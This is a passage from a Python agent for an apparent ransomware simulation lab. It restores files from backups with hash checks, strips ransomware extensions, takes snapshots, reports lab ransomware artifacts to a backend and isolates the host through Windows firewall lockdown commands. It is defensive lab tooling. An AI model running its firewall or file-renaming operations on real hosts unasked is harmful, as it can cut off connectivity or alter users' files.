            os.makedirs(conflict_dir, exist_ok=True)
        
        file_results = []
        restored_count = 0
        failed_count = 0
        skipped_count = 0
        
        for action in restore_actions:
            action_id = action.get("action_id")
            original_path = action.get("original_path")
            backup_path = action.get("backup_path")
            expected_hash = action.get("expected_hash")
            
            result = {
                "action_id": action_id,
                "original_path": original_path,
                "success": False,
                "before_hash": None,
                "after_hash": None,
                "hash_verified": None,
                "error": None,
                "conflict_backup_path": None
            }
            
            # Validate path safety
            is_safe, reason = self._is_path_safe_for_rollback(original_path, safe_paths)
            if not is_safe:
                result["error"] = f"Path not safe: {reason}"
                skipped_count += 1
                file_results.append(result)
                self.logger.warning(f"[ROLLBACK] SKIP: {original_path} - {reason}")
                continue
            
            try:
                # Check if file currently exists
                file_exists = os.path.exists(original_path)
                
                if file_exists:
                    # Compute hash of current file
                    result["before_hash"] = self._compute_file_hash(original_path)
                    
                    # Check if file is unchanged (same as backup)
                    if result["before_hash"] == expected_hash:
                        result["success"] = True
                        result["hash_verified"] = True
                        result["after_hash"] = result["before_hash"]
                        skipped_count += 1
                        self.logger.info(f"[ROLLBACK] SKIP (unchanged): {original_path}")
                        file_results.append(result)
                        continue
                    
                    # Handle conflict based on policy
                    if conflict_policy == "QUARANTINE":
                        # Move current file to conflict directory
                        conflict_path = os.path.join(
                            conflict_dir, 
                            os.path.basename(original_path) + f".conflict_{plan_id}"
                        )
                        if not dry_run:
                            os.makedirs(os.path.dirname(conflict_path), exist_ok=True)
                            shutil.move(original_path, conflict_path)
                        result["conflict_backup_path"] = conflict_path
                        self.logger.info(f"[ROLLBACK] CONFLICT: Moved {original_path} to {conflict_path}")
                    elif conflict_policy == "SKIP":
                        result["error"] = "File exists and differs - skipped due to conflict policy"
                        skipped_count += 1
                        file_results.append(result)
                        continue
                    # OVERWRITE: just proceed with restore
                
                # Restore file from backup
                if backup_path and os.path.exists(backup_path):
                    if not dry_run:
                        # Ensure directory exists
                        os.makedirs(os.path.dirname(original_path), exist_ok=True)
                        shutil.copy2(backup_path, original_path)
                    
                    # Verify restored file
                    if not dry_run:
                        result["after_hash"] = self._compute_file_hash(original_path)
                        result["hash_verified"] = (result["after_hash"] == expected_hash)
                    else:
                        result["after_hash"] = expected_hash
                        result["hash_verified"] = True
                    
                    result["success"] = True
                    restored_count += 1
                    self.logger.info(f"[ROLLBACK] RESTORED: {original_path} (verified={result['hash_verified']})")
                else:
                    result["error"] = f"Backup file not found: {backup_path}"
                    failed_count += 1
                    self.logger.error(f"[ROLLBACK] FAIL: {original_path} - backup not found")
                    
            except PermissionError as e:
                result["error"] = f"Permission denied: {e}"
                failed_count += 1
                self.logger.error(f"[ROLLBACK] FAIL: {original_path} - permission denied")
            except Exception as e:
                result["error"] = str(e)
                failed_count += 1
                self.logger.error(f"[ROLLBACK] FAIL: {original_path} - {e}")
            
            file_results.append(result)
        
        # Report results back to backend
        try:
            response = requests.post(
                f"{self.backend_url}/api/rollback/result/{plan_id}",
                json={"file_results": file_results},
                timeout=30
            )
            if response.status_code == 200:
                self.logger.info(f"[ROLLBACK] Results reported to backend")
            else:
                self.logger.warning(f"[ROLLBACK] Failed to report results: {response.status_code}")
        except Exception as e:
            self.logger.error(f"[ROLLBACK] Failed to report results: {e}")
        
        summary = f"Rollback complete: {restored_count} restored, {skipped_count} skipped, {failed_count} failed"
        self.logger.info(f"[ROLLBACK] {summary}")
        
        return (failed_count == 0, summary)
    
    def rollback_verify_hashes(self, parameters: dict) -> Tuple[bool, str]:
        """
        Verify that restored files match expected hashes.
        
        Parameters:
            plan_id: Rollback plan ID
            files: List of {path, expected_hash} to verify
        """
        plan_id = parameters.get("plan_id")
        files = parameters.get("files", [])
        
        self.logger.info(f"[ROLLBACK] Verifying hashes for plan {plan_id} ({len(files)} files)")
        
        verified = 0
        failed = 0
        results = []
        
        for file_info in files:
            path = file_info.get("path")
            expected_hash = file_info.get("expected_hash")
            
            if not os.path.exists(path):
                results.append({"path": path, "verified": False, "error": "File not found"})
                failed += 1
                continue
            
            actual_hash = self._compute_file_hash(path)
            
            if actual_hash == expected_hash:
                results.append({"path": path, "verified": True, "hash": actual_hash})
                verified += 1
            else:
                results.append({
                    "path": path, 
                    "verified": False, 
                    "expected": expected_hash, 
                    "actual": actual_hash
                })
                failed += 1
        
        summary = f"Hash verification: {verified} passed, {failed} failed"
        self.logger.info(f"[ROLLBACK] {summary}")
        
        return (failed == 0, json.dumps({"summary": summary, "results": results}))
    
    def rollback_cleanup_extensions(self, parameters: dict) -> Tuple[bool, str]:
        """
        Clean up ransomware extensions from files.
        
        Removes extensions like .locked, .encrypted, .dwcrypt from file names.
        Only operates on safe paths.
        
        Parameters:
            safe_paths: List of allowed paths to scan
            extensions: List of extensions to remove (e.g., [".locked", ".encrypted"])
            dry_run: If True, simulate without making changes
        """
        safe_paths = parameters.get("safe_paths", self.ROLLBACK_SAFE_PATHS)
        extensions = parameters.get("extensions", [".locked", ".encrypted", ".dwcrypt"])
        dry_run = parameters.get("dry_run", False)
        
        self.logger.info(f"[ROLLBACK] Cleaning up extensions: {extensions}")
        self.logger.info(f"[ROLLBACK] Scanning paths: {safe_paths}")
        
        cleaned = 0
        skipped = 0
        failed = 0
        
        for safe_path in safe_paths:
            if not os.path.exists(safe_path):
                continue
            
            for root, dirs, files in os.walk(safe_path):
                for filename in files:
                    for ext in extensions:
                        if filename.endswith(ext):
                            old_path = os.path.join(root, filename)
                            new_name = filename[:-len(ext)]  # Remove extension
                            new_path = os.path.join(root, new_name)
                            
                            # Validate path safety
                            is_safe, _ = self._is_path_safe_for_rollback(old_path, safe_paths)
                            if not is_safe:
                                skipped += 1
                                continue
                            
                            try:
                                if not dry_run:
                                    # Check if target already exists
                                    if os.path.exists(new_path):
                                        self.logger.warning(f"[ROLLBACK] Target exists, skipping: {new_path}")
                                        skipped += 1
                                        continue
                                    
                                    os.rename(old_path, new_path)
                                
                                cleaned += 1
                                self.logger.info(f"[ROLLBACK] Cleaned: {filename} -> {new_name}")
                            except Exception as e:
                                failed += 1
                                self.logger.error(f"[ROLLBACK] Failed to clean {filename}: {e}")
                            
                            break  # Only process first matching extension
        
        summary = f"Extension cleanup: {cleaned} cleaned, {skipped} skipped, {failed} failed"
        self.logger.info(f"[ROLLBACK] {summary}")
        
        return (failed == 0, summary)
    
    def backup_create_snapshot(self, parameters: dict) -> Tuple[bool, str]:
        """
        Create a baseline snapshot of files in safe paths.
        
        ACTUALLY COPIES files to a backup directory for real rollback support.
        
        Parameters:
            snapshot_id: Snapshot record ID
            snapshot_name: Name for the snapshot
            safe_paths: List of paths to backup
            label: Snapshot label
        """
        snapshot_id = parameters.get("snapshot_id")
        snapshot_name = parameters.get("snapshot_name", f"snapshot_{snapshot_id}")
        safe_paths = parameters.get("safe_paths", self.ROLLBACK_SAFE_PATHS)
        label = parameters.get("label", "baseline")
        
        # Create backup directory
        backup_base_dir = rf"C:\RansomRun\backups\{snapshot_name}"
        os.makedirs(backup_base_dir, exist_ok=True)
        
        self.logger.info(f"[SNAPSHOT] Creating snapshot: {snapshot_name}")
        self.logger.info(f"[SNAPSHOT] Backup directory: {backup_base_dir}")
        self.logger.info(f"[SNAPSHOT] Scanning paths: {safe_paths}")
        
        manifest = {
            "snapshot_id": snapshot_id,
            "snapshot_name": snapshot_name,
            "label": label,
            "backup_directory": backup_base_dir,
            "created_at": datetime.utcnow().isoformat(),
            "hostname": self.hostname,
            "agent_id": self.agent_id,
            "files": []
        }
        
        total_files = 0
        backed_up = 0
        failed = 0
        
        for safe_path in safe_paths:
            if not os.path.exists(safe_path):
                self.logger.warning(f"[SNAPSHOT] Path not found: {safe_path}")
                continue
            
            for root, dirs, files in os.walk(safe_path):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    total_files += 1
                    
                    # Skip hidden/system files
                    if filename.startswith('.'):
                        continue
                    
                    try:
                        # Get file info
                        stat = os.stat(filepath)
                        file_size = stat.st_size
                        mtime = stat.st_mtime
                        
                        # Compute hash for smaller files
                        file_hash = None
                        if file_size < 50 * 1024 * 1024:  # 50MB limit
                            file_hash = self._compute_file_hash(filepath)
                        
                        # Create backup path preserving directory structure
                        # e.g., C:\RansomTest\doc.txt -> C:\RansomRun\backups\snapshot_1\RansomTest\doc.txt
                        rel_path = os.path.relpath(filepath, os.path.splitdrive(filepath)[0] + os.sep)
                        backup_path = os.path.join(backup_base_dir, rel_path)
                        
                        # Create backup directory structure and copy file
                        os.makedirs(os.path.dirname(backup_path), exist_ok=True)
                        shutil.copy2(filepath, backup_path)
                        
                        manifest["files"].append({
                            "path": filepath,
                            "backup_path": backup_path,
                            "size": file_size,
                            "mtime": mtime,
                            "hash": file_hash,
                            "backed_up": True
                        })
                        backed_up += 1
                        self.logger.debug(f"[SNAPSHOT] Backed up: {filepath} -> {backup_path}")
                        
                    except Exception as e:
                        self.logger.error(f"[SNAPSHOT] Error processing {filepath}: {e}")
                        manifest["files"].append({
                            "path": filepath,
                            "error": str(e),
                            "backed_up": False
                        })
                        failed += 1
        
        manifest["total_files"] = total_files
        manifest["files_backed_up"] = backed_up
        manifest["files_failed"] = failed
        
        # Report snapshot completion to backend
        try:
            response = requests.post(
                f"{self.backend_url}/api/rollback/snapshot/complete",
                json={
                    "snapshot_id": snapshot_id,
                    "manifest": manifest,
                    "total_files": total_files,
                    "files_backed_up": backed_up,
                    "files_failed": failed
                },
                timeout=30
            )
            if response.status_code == 200:
                self.logger.info(f"[SNAPSHOT] Reported to backend successfully")
            else:
                self.logger.warning(f"[SNAPSHOT] Failed to report: {response.status_code}")
        except Exception as e:
            self.logger.error(f"[SNAPSHOT] Failed to report to backend: {e}")
        
        summary = f"Snapshot created: {backed_up} files backed up to {backup_base_dir}, {failed} failed"
        self.logger.info(f"[SNAPSHOT] {summary}")
        
        return (failed == 0, summary)
    
    def rollback_dry_run(self, parameters: dict) -> Tuple[bool, str]:
        """
        Perform a dry run of rollback without making changes.
        
        Returns what would be restored/skipped/conflicted.
        """
        # Just call restore with dry_run=True
        parameters["dry_run"] = True
        return self.rollback_restore_from_snapshot(parameters)
    
    # =========================================================================
    # MAIN LOOP
    # =========================================================================
    # CONTAINMENT & ISOLATION METHODS
    # =========================================================================
    
    def _report_ransomware_artifacts(self, run_id: Optional[int], scenario_config: dict, directories: List[str]):
        """Report ransomware artifact paths to backend for containment UI."""
        if not run_id:
            return
        
        try:
            # Determine entry path (the script/payload that was executed)
            entry_path = sys.argv[0] if sys.argv else None
            if entry_path:
                entry_path = str(Path(entry_path).resolve())
            
            # Get working directory
            working_dir = os.getcwd()
            
            # Target directory from config
            target_dir = directories[0] if directories else TEST_DIR
            
            # Look for ransom note path
            ransom_note_path = None
            ransom_config = scenario_config.get("ransom_note", {})
            if ransom_config:
                note_filename = ransom_config.get("filename", "README_RESTORE.txt")
                potential_note = Path(target_dir) / note_filename
                if potential_note.exists():
                    ransom_note_path = str(potential_note)
            
            # Look for encryption key (LAB ONLY)
            encryption_key_path = None
            key_file = Path(target_dir) / "encryption_key.key"
            if key_file.exists():
                encryption_key_path = str(key_file)
            
            # Process info
            process_info = {
                "pid": os.getpid(),
                "name": Path(sys.executable).name if sys.executable else "python.exe",
                "command_line": " ".join(sys.argv) if sys.argv else "",
                "sha256": None  # Could compute hash if needed
            }
            
            # Look for dropped payload (polymorphic mode)
            dropped_payload_path = None
            polymorphic_dir = Path(r"C:\ProgramData\RansomRun\Payloads")
            if polymorphic_dir.exists():
                payloads = list(polymorphic_dir.glob("*.py")) + list(polymorphic_dir.glob("*.exe"))
                if payloads:
                    dropped_payload_path = str(payloads[0])
            
            payload = {
                "run_id": run_id,
                "host": self.hostname,
                "ransomware": {
                    "entry_path": entry_path,
                    "dropped_payload_path": dropped_payload_path,
                    "working_dir": working_dir,
                    "target_dir": target_dir,
                    "ransom_note_path": ransom_note_path,
                    "encryption_key_path": encryption_key_path,
                    "process": process_info
                }
            }
            
            response = requests.post(
                f"{self.backend_url}/api/runs/{run_id}/containment/report-artifacts",
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                self.logger.info("Ransomware artifacts reported for containment")
            else:
                self.logger.warning(f"Failed to report artifacts: {response.status_code}")
                
        except Exception as e:
            self.logger.warning(f"Failed to report ransomware artifacts: {e}")
    
    # =========================================================================
    # CONTAINMENT UTILITIES - Admin Check, PowerShell, Firewall State
    # =========================================================================
    #
    # TROUBLESHOOTING NOTES (for operators/developers):
    # =================================================
    #
    # 1. HOW TO RUN AGENT AS ADMINISTRATOR:
    #    - Right-click Command Prompt -> "Run as administrator"
    #    - Then: cd C:\path\to\RansomRun && python agent\agent.py
    #    - Or create a shortcut with "Run as administrator" checked
    #
    # 2. WHERE STATE FILE IS STORED:
    #    - C:\ProgramData\RansomRun\containment_state.json
    #    - Contains: original firewall profiles, isolation timestamp, backend IP
    #    - Delete this file to force a fresh state
    #
    # 3. HOW TO VERIFY FIREWALL RULES EXIST:
    #    PowerShell (Admin):
    #      Get-NetFirewallRule | Where-Object {$_.DisplayName -like 'RANSOMRUN_*'}
    #    Or netsh:
    #      netsh advfirewall firewall show rule name=all | findstr "RANSOMRUN"
    #
    # 4. HOW TO MANUALLY REMOVE ALL RANSOMRUN RULES:
    #    PowerShell (Admin):
    #      Get-NetFirewallRule | Where-Object {$_.DisplayName -like 'RANSOMRUN_*'} | Remove-NetFirewallRule
    #    Or netsh (one by one):
    #      netsh advfirewall firewall delete rule name=RANSOMRUN_BACKEND_OUT
    #      netsh advfirewall firewall delete rule name=RANSOMRUN_BACKEND_IN
    #      (etc.)
    #
    # 5. HOW TO CHECK CURRENT FIREWALL PROFILE STATE:
    #    PowerShell:
    #      Get-NetFirewallProfile | Select Name, Enabled, DefaultInboundAction, DefaultOutboundAction
    #    Or netsh:
    #      netsh advfirewall show allprofiles
    #
    # 6. HOW TO MANUALLY RESTORE OUTBOUND CONNECTIVITY:
    #    netsh advfirewall set allprofiles firewallpolicy blockinbound,allowoutbound
    #
    # 7. LOGS TO CHECK:
    #    - Agent log: C:\RansomTest\agent.log
    #    - Windows Event Viewer: Windows Logs -> Security (for firewall changes)
    #
    # 8. COMMON ISSUES:
    #    - "Administrator privileges required" -> Run agent as Admin
    #    - "Already isolated" -> Use force=True or delete state file
    #    - Restore doesn't work -> Check if RANSOMRUN rules still exist
    #    - Can't reach backend after isolation -> Check backend_ip parameter
    #
    # =========================================================================
    
    # Constants for containment
    CONTAINMENT_STATE_DIR = r"C:\ProgramData\RansomRun"
    CONTAINMENT_STATE_FILE = r"C:\ProgramData\RansomRun\containment_state.json"
    RANSOMRUN_RULE_PREFIX = "RANSOMRUN_"
    RANSOMRUN_RULE_GROUP = "RansomRun Containment"
    
    def _is_admin(self) -> bool:
        """
        Fast admin check using ctypes (preferred) or PowerShell fallback.
        Returns True if running with Administrator privileges.
        """
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            pass
        
        # Fallback to PowerShell check
        try:
            result = subprocess.run(
                ["powershell", "-ExecutionPolicy", "Bypass", "-Command",
                 "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"],
                capture_output=True,
                text=True,
                timeout=10
            )
            return result.stdout.strip().lower() == "true"
        except Exception as e:
            self.logger.warning(f"Admin check failed: {e}")
            return False
    
    def _check_admin_privileges(self) -> bool:
        """Legacy alias for _is_admin()."""
        return self._is_admin()

    def _run_powershell(self, command: str, timeout: int = 60) -> tuple:
        """
        Run a PowerShell command and return (success, stdout, stderr).
        Logs the command and output for debugging.
        """
        self.logger.debug(f"[PS] Running: {command[:200]}...")
        try:
            result = subprocess.run(
                ["powershell", "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", command],
                capture_output=True,
                text=True,
                timeout=timeout
            )
            success = result.returncode == 0
            if not success:
                self.logger.warning(f"[PS] Command failed (rc={result.returncode}): {result.stderr[:500]}")
            return (success, result.stdout, result.stderr)
        except subprocess.TimeoutExpired:
            self.logger.error(f"[PS] Command timed out after {timeout}s")
            return (False, "", f"Command timed out after {timeout}s")
        except Exception as e:
            self.logger.error(f"[PS] Command error: {e}")
            return (False, "", str(e))

    def _get_firewall_profiles_state(self) -> dict:
        """
        Capture current firewall profile states using PowerShell.
        Returns dict with Domain/Private/Public profile settings.
        """
        self.logger.info("[CONTAINMENT] Capturing firewall profile states...")
        
        ps_command = """
$profiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue | ForEach-Object {
    @{
        Name = $_.Name
        Enabled = $_.Enabled.ToString()
        DefaultInboundAction = $_.DefaultInboundAction.ToString()
        DefaultOutboundAction = $_.DefaultOutboundAction.ToString()
    }
}
$profiles | ConvertTo-Json -Compress
"""
        success, stdout, stderr = self._run_powershell(ps_command, timeout=30)
        
        if not success or not stdout.strip():
            self.logger.warning(f"[CONTAINMENT] Failed to get firewall profiles: {stderr}")
            # Return sensible defaults
            return {
                "profiles": {
                    "Domain": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"},
                    "Private": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"},
                    "Public": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"}
                },
                "capture_failed": True
            }
        
        try:
            # Parse JSON output
            profiles_list = json.loads(stdout.strip())
            # Handle single profile (returns object) vs multiple (returns array)
            if isinstance(profiles_list, dict):
                profiles_list = [profiles_list]
            
            profiles = {}
            for p in profiles_list:
                profiles[p["Name"]] = {
                    "Enabled": p["Enabled"],
                    "DefaultInboundAction": p["DefaultInboundAction"],
                    "DefaultOutboundAction": p["DefaultOutboundAction"]
                }
            
            self.logger.info(f"[CONTAINMENT] Captured profiles: {list(profiles.keys())}")
            return {"profiles": profiles, "capture_failed": False}
            
        except json.JSONDecodeError as e:
            self.logger.warning(f"[CONTAINMENT] JSON parse error: {e}, stdout: {stdout[:500]}")
            return {
                "profiles": {
                    "Domain": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"},
                    "Private": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"},
                    "Public": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"}
                },
                "capture_failed": True
            }

    def _save_containment_state(self, state: dict) -> bool:
        """Save containment state to JSON file."""
        try:
            state_dir = Path(self.CONTAINMENT_STATE_DIR)
            state_dir.mkdir(parents=True, exist_ok=True)
            
            state_file = Path(self.CONTAINMENT_STATE_FILE)
            state_file.write_text(json.dumps(state, indent=2))
            self.logger.info(f"[CONTAINMENT] State saved to {state_file}")
            return True
        except Exception as e:
            self.logger.error(f"[CONTAINMENT] Failed to save state: {e}")
            return False

    def _load_containment_state(self) -> Optional[dict]:
        """Load containment state from JSON file. Returns None if not found."""
        try:
            state_file = Path(self.CONTAINMENT_STATE_FILE)
            if not state_file.exists():
                self.logger.info("[CONTAINMENT] No state file found")
                return None
            
            state = json.loads(state_file.read_text())
            self.logger.info(f"[CONTAINMENT] State loaded, isolated={state.get('isolated', False)}")
            return state
        except Exception as e:
            self.logger.warning(f"[CONTAINMENT] Failed to load state: {e}")
            return None

    def _delete_containment_state(self) -> bool:
        """Delete the containment state file."""
        try:
            state_file = Path(self.CONTAINMENT_STATE_FILE)
            if state_file.exists():
                state_file.unlink()
                self.logger.info("[CONTAINMENT] State file deleted")
            return True
        except Exception as e:
            self.logger.warning(f"[CONTAINMENT] Failed to delete state file: {e}")
            return False

    def _remove_ransomrun_firewall_rules(self) -> dict:
        """
        Remove ALL firewall rules with RANSOMRUN_ prefix.
        Returns dict with count of rules removed and any errors.
        """
        self.logger.info("[CONTAINMENT] Removing all RANSOMRUN_ firewall rules...")
        
        # Use PowerShell to find and remove all matching rules
        ps_command = f"""
$removed = 0
$errors = @()
$rules = Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object {{ $_.DisplayName -like '{self.RANSOMRUN_RULE_PREFIX}*' }}
foreach ($rule in $rules) {{
    try {{
        Remove-NetFirewallRule -Name $rule.Name -ErrorAction Stop
        $removed++
    }} catch {{
        $errors += $_.Exception.Message
    }}
}}
@{{ Removed = $removed; Errors = $errors }} | ConvertTo-Json -Compress
"""
        success, stdout, stderr = self._run_powershell(ps_command, timeout=30)
        
        result = {"removed": 0, "errors": []}
        if stdout.strip():
            try:
                result = json.loads(stdout.strip())
            except:
                pass
        
        self.logger.info(f"[CONTAINMENT] Removed {result.get('removed', 0)} RANSOMRUN rules")
        if result.get('errors'):
            self.logger.warning(f"[CONTAINMENT] Rule removal errors: {result['errors']}")
        
        return result

    def _apply_firewall_profile_state(self, profiles: dict) -> bool:
        """
        Apply firewall profile settings from saved state.
        profiles: dict mapping profile name to settings
        """
        self.logger.info("[CONTAINMENT] Applying firewall profile states...")
        
        all_success = True
        for profile_name, settings in profiles.items():
            enabled = settings.get("Enabled", "True")
            inbound = settings.get("DefaultInboundAction", "Block")
            outbound = settings.get("DefaultOutboundAction", "Allow")
            
            # Map string values to PowerShell enum values
            enabled_val = "True" if enabled.lower() == "true" else "False"
            
            ps_command = f"""
Set-NetFirewallProfile -Name '{profile_name}' -Enabled {enabled_val} -DefaultInboundAction {inbound} -DefaultOutboundAction {outbound} -ErrorAction Stop
"""
            success, stdout, stderr = self._run_powershell(ps_command, timeout=15)
            
            if success:
                self.logger.info(f"[CONTAINMENT] Profile '{profile_name}': Enabled={enabled_val}, In={inbound}, Out={outbound}")
            else:
                self.logger.warning(f"[CONTAINMENT] Failed to set profile '{profile_name}': {stderr}")
                all_success = False
        
        return all_success

    def _verify_isolation(self, backend_ip: str, backend_port: int) -> dict:
        """Verify isolation by testing connectivity."""
        results = {
            "backend_reachable": False,
            "internet_blocked": False,
            "backend_test_output": "",
            "internet_test_output": ""
        }
        
        # Test backend connectivity (quick ping test)
        self.logger.info(f"[CONTAINMENT] Testing backend connectivity to {backend_ip}:{backend_port}...")
        try:
            ping = subprocess.run(
                ["ping", "-n", "1", "-w", "2000", backend_ip],
                capture_output=True, text=True, timeout=5
            )
            results["backend_reachable"] = ping.returncode == 0
            results["backend_test_output"] = "ping succeeded" if ping.returncode == 0 else "ping failed"
        except:
            results["backend_test_output"] = "ping test error"
        
        # Test internet (should be blocked)
        self.logger.info("[CONTAINMENT] Testing internet connectivity (should be blocked)...")
        try:
            ping = subprocess.run(
                ["ping", "-n", "1", "-w", "2000", "8.8.8.8"],
                capture_output=True, text=True, timeout=5
            )
            results["internet_blocked"] = ping.returncode != 0
            results["internet_test_output"] = "blocked" if ping.returncode != 0 else "NOT blocked"
        except:
            results["internet_blocked"] = True
            results["internet_test_output"] = "test error (assuming blocked)"
        
        self.logger.info(f"[CONTAINMENT] Verification: backend_reachable={results['backend_reachable']}, internet_blocked={results['internet_blocked']}")
        return results

    def containment_isolate_host(self, parameters: dict) -> tuple:
        """
        STATEFUL host isolation - blocks all network traffic except backend communication.
        
        This implementation:
        1. Captures EXACT firewall profile state BEFORE isolation (Enabled, DefaultInbound, DefaultOutbound)
        2. Saves state to C:\\ProgramData\\RansomRun\\containment_state.json
        3. Creates firewall rules with RANSOMRUN_ prefix for easy cleanup
        4. Verifies isolation worked
        5. Is IDEMPOTENT - won't duplicate rules if already isolated
        
        Restore will use saved state to revert EXACTLY to pre-isolation configuration.
        """
        import time
        start_time = time.time()
        
        run_id = parameters.get("run_id")
        method = parameters.get("method", "firewall_lockdown")
        dry_run = parameters.get("dry_run", True)
        force = parameters.get("force", False)
        
        # AUTO-DETECT backend IP from agent's backend_url
        try:
            from urllib.parse import urlparse
            parsed = urlparse(self.backend_url)
            detected_ip = parsed.hostname or "127.0.0.1"
            detected_port = parsed.port or 8000
        except:
            detected_ip = "127.0.0.1"
            detected_port = 8000
        
        backend_ip = parameters.get("backend_ip", detected_ip)
        backend_port = parameters.get("backend_port", detected_port)
        
        self.logger.info(f"[CONTAINMENT] ===== ISOLATE HOST (STATEFUL) =====")
        self.logger.info(f"[CONTAINMENT] Backend: {backend_ip}:{backend_port}, DryRun: {dry_run}, Force: {force}")
        
        result_data = {
            "action": "isolate_host",
            "method": method,
            "dry_run": dry_run,
            "backend_ip": backend_ip,
            "backend_port": backend_port,
            "commands_executed": [],
            "verification": None,
            "error": None,
            "is_isolated": False
        }
        
        # =====================================================================
        # DRY RUN - Show what would happen
        # =====================================================================
        if dry_run:
            self.logger.info("[CONTAINMENT] DRY RUN - No changes will be made")
            result_data["status"] = "dry_run"
            result_data["commands_planned"] = [
                "Capture firewall profile states (Get-NetFirewallProfile)",
                "Save state to containment_state.json",
                "Set all profiles: DefaultOutboundAction=Block",
                f"Create RANSOMRUN_BACKEND_OUT rule (allow {backend_ip})",
                f"Create RANSOMRUN_BACKEND_IN rule (allow {backend_ip})",
                "Create RANSOMRUN_LOCALHOST_OUT rule (allow 127.0.0.1)",
                "Create RANSOMRUN_LOCALHOST_IN rule (allow 127.0.0.1)",
                "Create RANSOMRUN_DNS_OUT rule (allow UDP 53)",
                "Verify: ping 8.8.8.8 should fail"
            ]
            return (True, json.dumps(result_data))
        
        # =====================================================================
        # ADMIN CHECK - Required for firewall changes
        # =====================================================================
        if not self._is_admin():
            self.logger.error("[CONTAINMENT] Administrator privileges required for isolation")
            result_data["status"] = "failed"
            result_data["error"] = "Containment requires Administrator privileges. Run agent as Administrator."
            return (False, json.dumps(result_data))
        
        self.logger.info("[CONTAINMENT] Admin check: PASSED")
        result_data["commands_executed"].append({"step": "admin_check", "ok": True})
        
        # =====================================================================
        # IDEMPOTENCY CHECK - Don't re-isolate if already isolated
        # =====================================================================
        existing_state = self._load_containment_state()
        if existing_state and existing_state.get("isolated", False) and not force:
            self.logger.info("[CONTAINMENT] Host is already isolated (use force=True to re-isolate)")
            result_data["status"] = "already_isolated"
            result_data["is_isolated"] = True
            result_data["previous_isolation"] = existing_state.get("timestamp")
            return (True, json.dumps(result_data))
        
        # =====================================================================
        # STEP 1: Capture current firewall state BEFORE making changes
        # =====================================================================
        self.logger.info("[CONTAINMENT] STEP 1: Capturing pre-isolation firewall state...")
        fw_state = self._get_firewall_profiles_state()
        result_data["commands_executed"].append({
            "step": "capture_state", 
            "ok": not fw_state.get("capture_failed", False),
            "profiles_captured": list(fw_state.get("profiles", {}).keys())
        })
        
        if fw_state.get("capture_failed"):
            self.logger.warning("[CONTAINMENT] State capture had issues, using defaults")
        
        # =====================================================================
        # STEP 2: Remove any existing RANSOMRUN rules (clean slate)
        # =====================================================================
        self.logger.info("[CONTAINMENT] STEP 2: Cleaning up any existing RANSOMRUN rules...")
        cleanup_result = self._remove_ransomrun_firewall_rules()
        result_data["commands_executed"].append({
            "step": "cleanup_existing_rules",
            "ok": True,
            "rules_removed": cleanup_result.get("removed", 0)
        })
        
        # =====================================================================
        # STEP 3: Enable firewall on all profiles
        # =====================================================================
        self.logger.info("[CONTAINMENT] STEP 3: Enabling firewall on all profiles...")
        enable_result = subprocess.run(
            ["netsh", "advfirewall", "set", "allprofiles", "state", "on"],
            capture_output=True, text=True, timeout=10
        )
        result_data["commands_executed"].append({
            "step": "enable_firewall",
            "ok": enable_result.returncode == 0
        })
        
        # =====================================================================
        # STEP 4: Set BLOCK outbound policy on all profiles (containment)
        # =====================================================================
        self.logger.info("[CONTAINMENT] STEP 4: Setting outbound BLOCK policy...")
        block_result = subprocess.run(
            ["netsh", "advfirewall", "set", "allprofiles", "firewallpolicy", "blockinbound,blockoutbound"],
            capture_output=True, text=True, timeout=10
        )
        
        if block_result.returncode != 0:
            self.logger.error(f"[CONTAINMENT] Failed to set block policy: {block_result.stderr}")
            result_data["status"] = "failed"
            result_data["error"] = f"Failed to set firewall block policy: {block_result.stderr}"
            return (False, json.dumps(result_data))
        
        result_data["commands_executed"].append({"step": "set_block_policy", "ok": True})
        
        # =====================================================================
        # STEP 5: Create RANSOMRUN allow rules for backend communication
        # =====================================================================
        self.logger.info(f"[CONTAINMENT] STEP 5: Creating allow rules for backend {backend_ip}...")
        
        rules_to_create = [
            # Backend outbound - allow agent to talk to backend
            {
                "name": "RANSOMRUN_BACKEND_OUT",
                "args": ["dir=out", "action=allow", f"remoteip={backend_ip}", "protocol=any", "enable=yes"]
            },
            # Backend inbound - allow responses from backend
            {
                "name": "RANSOMRUN_BACKEND_IN", 
                "args": ["dir=in", "action=allow", f"remoteip={backend_ip}", "protocol=any", "enable=yes"]
            },
            # Localhost outbound
            {
                "name": "RANSOMRUN_LOCALHOST_OUT",
                "args": ["dir=out", "action=allow", "remoteip=127.0.0.1,::1", "protocol=any", "enable=yes"]
            },
            # Localhost inbound
            {
                "name": "RANSOMRUN_LOCALHOST_IN",
                "args": ["dir=in", "action=allow", "remoteip=127.0.0.1,::1", "protocol=any", "enable=yes"]
            },
            # DNS outbound (needed for hostname resolution if using hostnames)
            {
                "name": "RANSOMRUN_DNS_OUT",
                "args": ["dir=out", "action=allow", "protocol=udp", "remoteport=53", "enable=yes"]
            }
        ]
        
        rules_created = 0
        for rule in rules_to_create:
            cmd = ["netsh", "advfirewall", "firewall", "add", "rule", f"name={rule['name']}"] + rule["args"]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                rules_created += 1
                self.logger.info(f"[CONTAINMENT] Created rule: {rule['name']}")
            else:
                self.logger.warning(f"[CONTAINMENT] Failed to create rule {rule['name']}: {r.stderr}")
        
        result_data["commands_executed"].append({
            "step": "create_allow_rules",
            "ok": rules_created >= 2,  # At minimum need backend rules
            "rules_created": rules_created,
            "rules_attempted": len(rules_to_create)
        })
        
        # =====================================================================
        # STEP 6: Verify isolation
        # =====================================================================
        self.logger.info("[CONTAINMENT] STEP 6: Verifying isolation...")
